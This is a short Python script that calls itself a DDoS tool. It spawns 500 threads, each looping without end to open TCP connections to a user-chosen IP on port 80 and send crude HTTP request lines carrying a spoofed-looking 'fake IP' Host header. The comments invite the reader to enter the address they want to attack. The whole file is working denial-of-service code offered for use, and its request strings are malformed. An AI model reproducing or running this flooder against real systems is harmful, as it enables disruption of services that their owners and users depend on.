import threading
import socket

target = "" # IP Address you want to DDOS, I tested it on my own router , `ipconfig` in your terminal to find out your IP Address
port = 80  # Port number you got
fakeip = '182.20.19.0' #choose an IP

already_connect = 0 

# Attack method, basically just an endless loop running with a socket method
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host :  /" + fakeip + "/1.1\r\n").encode('ascii'), (target, port))
        s.close()
        global already_connect
        already_connect+=1
        #print already_connect to see if you are getting requests. 
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()